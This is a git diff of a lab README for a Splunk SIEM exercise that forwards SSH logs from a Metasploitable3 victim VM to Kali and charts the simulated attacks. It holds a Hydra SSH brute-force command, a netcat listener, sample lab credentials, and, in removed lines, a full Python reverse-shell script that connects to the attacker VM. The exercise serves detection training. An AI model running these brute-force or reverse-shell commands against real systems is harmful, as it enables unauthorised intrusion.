@@ -1,14 +1,24 @@
-# 🛡️ Phase 2: SIEM - Dashboard Analysis
 
-## 🎯 Objective.
+#  Phase 2: SIEM - Dashboard Analysis
 
-- Integrate logs from the **victim machine** (Metasploitable3) into a **SIEM server** (Splunk running on the attacker/Kali VM).
-- Visualize attack logs to identify patterns such as brute-force attempts and reverse shells.
-- Compare the behavior and timeline of events before and after compromise.
+##  Objective
+
+This phase focuses on **Security Information and Event Management (SIEM)** using **Splunk**. The goal is to:
+- Collect and forward logs from the **Metasploitable3 victim machine**.
+- Ingest and index logs on **Splunk running on the Kali (attacker) VM**.
+- Visualize attack events such as brute-force logins and reverse shell triggers.
+- Build dashboards to observe timelines and behavior changes during exploitation.
 
 ---
 
-## 🔧 Splunk Server Setup (Kali VM)
+##  Splunk Server Setup (Kali VM)
+
+### Why Splunk?
+
+Splunk provides real-time log analysis, making it an ideal SIEM solution for identifying anomalies and attack patterns. It supports:
+- Log collection from multiple sources
+- Indexing and searching large log volumes
+- Graphical dashboard visualization
 
 ### Installation
 ```bash
@@ -17,24 +27,35 @@ sudo dpkg -i splunk-9.3.2.deb
 sudo /opt/splunk/bin/splunk start --accept-license
 sudo /opt/splunk/bin/splunk enable boot-start
 ```
+- **Why this?** This installs Splunk Enterprise and configures it to start on system boot.
 
 ### Access Web Interface
-Open in browser:
+Visit Splunk via browser:
 ```
 http://192.168.142.129:8000
 ```
-Log in with:
-- **Username:** admin
-- **Password:** admin123
 
-### Enable TCP 9997 Port (to receive logs)
-- Navigate to **Settings > Forwarding and Receiving > Add New (Receive Data)**
-- Add TCP port **9997**
-- Click **Save**
+- **Default Credentials**:  
+  - Username: `admin`  
+  - Password: `admin123`
+
+### Configure Receiving on TCP Port 9997
+This port is used by the Splunk **Universal Forwarder** to send logs.
+
+Steps:
+1. Go to **Settings > Forwarding and Receiving**
+2. Click **Add New** under “Receive data”
+3. Enter **9997** and click Save
+
+ This sets up the Splunk server to listen for logs on TCP port 9997.
 
 ---
 
-## 🔗 Splunk Forwarder Setup (Metasploitable3 VM)
+##  Splunk Forwarder Setup (Metasploitable3 VM)
+
+### Why Use a Forwarder?
+
+The **Universal Forwarder** is a lightweight Splunk agent that securely forwards local logs to the central SIEM server.
 
 ### Installation
 ```bash
@@ -44,125 +65,88 @@ sudo mv splunkforwarder /opt/splunkforwarder
 sudo /opt/splunkforwarder/bin/splunk start --accept-license
 ```
 
-### Connect to Splunk Server
+### Connect to Splunk Server (Kali)
 ```bash
 sudo /opt/splunkforwarder/bin/splunk enable boot-start
 sudo /opt/splunkforwarder/bin/splunk login -auth admin:admin123
 sudo /opt/splunkforwarder/bin/splunk add forward-server 192.168.142.129:9997
 ```
+ This links the victim’s logs to the Splunk instance on the attacker's VM.
 
-### Add SSH Log Monitoring
+### Monitor SSH Logs
 ```bash
 sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log
 sudo /opt/splunkforwarder/bin/splunk restart
 ```
 
+ **Why /var/log/auth.log?**  
+This log records authentication events (successful and failed SSH logins), making it ideal for monitoring brute-force and session hijacks.
+
 ---
 
-## ⚔️ Attacks Performed
+##  Attacks Simulated
 
-### 1. SSH Brute-force with Hydra
+### 1. SSH Brute-force via Hydra
 ```bash
-hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.131 -t 4
+hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.131 
 ```
+- Simulates a real-world password attack using common credentials.
 
-### 2. Reverse Shell via Python Script
-```python
-import socket,subprocess,os
-s=socket.socket()
-s.connect(("192.168.142.129",4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-subprocess.call(["/bin/sh","-i"])
+### 2. Reverse Shell via Python
+```bash
+run ssh_bruteforce_reverse.py
 ```
+- Once connected, the victim's shell is controlled remotely via TCP.
 
 ### 3. Netcat Listener on Kali
 ```bash
 nc -lvnp 4444
 ```
+- Used by the attacker to capture the reverse shell connection.
 
 ---
 
 ## 📊 Visualization in Splunk
 
-### Open Splunk Search:
+### Open the Search Dashboard
 ```
 http://192.168.142.129:8000/en-US/app/search/search
 ```
 
-### Sample Queries:
-- Failed SSH logins:
-  ```spl
-  index=main "Failed password"
-  ```
-- Successful logins:
-  ```spl
-  index=main "Accepted password"
-  ```
-- Reverse shell detection:
-  ```spl
-  index=main "session opened" OR "session closed"
-  ```
+### Sample Queries
 
-### Bar Chart Visualization:
-- Use **Visualizations > Bar Chart**
-- X-Axis: `_time`, Y-Axis: `count`, Split: `event_type`
+#### Failed SSH Login Attempts
+```spl
+index=main "Failed password"
+```
+- Useful for identifying brute-force patterns.
 
----
+#### Successful SSH Logins
+```spl
+index=main "Accepted password"
+```
+- Confirms whether the attacker successfully accessed the victim.
 
-## 📸 Required Screenshots
+#### Reverse Shell Detection
+```spl
+index=main "session opened" OR "session closed"
+```
+- Helps track session lifecycle after compromise.
 
-- Splunk web UI showing active log forwarding from Metasploitable3
-- Search results for:
-  - SSH brute-force (Hydra)
-  - Reverse shell events
-- Visualization bar charts for the above queries
-- Terminal on Kali VM showing:
-  - Hydra execution
-  - Netcat receiving shell
-  - Python reverse shell trigger
+### Creating Visual Dashboards
+Use Splunk’s **Visualization > Bar Chart**:
+- X-Axis: `_time`
+- Y-Axis: `count`
+- Split By: `event_type` or `host`
+
+ **Why Visualize?**
+Charts reveal the timeline and intensity of attacks—key for incident response and forensic analysis.
 
 ---
 
-## 🧠 Conclusion
 
-- SIEM integration was completed with Metasploitable3 as victim and Splunk on Kali as server.
-- Attacks were successfully simulated and visualized.
-- Dashboards clearly showed timeline escalation (Hydra ➔ login ➔ shell access).
-- These logs will be compared in **Phase 3** against defense mechanisms.
+##  Conclusion
 
-> Proceed to Phase 3 for defensive implementation and validation.
-> 
-
-
-Attacker:
-
-![Screenshot13](../screenshots/Screenshot13.png)
-![Screenshot14](../screenshots/Screenshot14.png)
-![Screenshot15](../screenshots/Screenshot15.png)
-![Screenshot16](../screenshots/Screenshot16.png)
-![Screenshot17](../screenshots/Screenshot17.png)
-
-
-victim:
-
-![Screenshot17](../screenshots/Screenshot17.png)
-![Screenshot18](../screenshots/Screenshot18.png)
-![Screenshot19](../screenshots/Screenshot19.png)
-![Screenshot20](../screenshots/Screenshot20.png)
-![Screenshot21](../screenshots/Screenshot21.png)
-![Screenshot22](../screenshots/Screenshot22.png)
-![Screenshot23](../screenshots/Screenshot23.png)
-![Screenshot24](../screenshots/Screenshot24.png)
-![Screenshot25](../screenshots/Screenshot25.png)
-![Screenshot26](../screenshots/Screenshot26.png)
-![Screenshot27](../screenshots/Screenshot27.png)
-![Screenshot28](../screenshots/Screenshot28.png)
-![Screenshot29](../screenshots/Screenshot29.png)
-![Screenshot30](..//screenshots/Screenshot30.png)
-![Screenshot31](../screenshots/Screenshot31.png)
-![Screenshot32](../screenshots/Screenshot32.png)
-![Screenshot33](../screenshots/Screenshot33.png)
-
-
+- Successfully implemented log forwarding from a vulnerable system to a SIEM.
+- Used Splunk to monitor and analyze SSH brute-force and reverse shell behaviors.
+- Demonstrated how timelines can expose attacker progression from login to shell control.
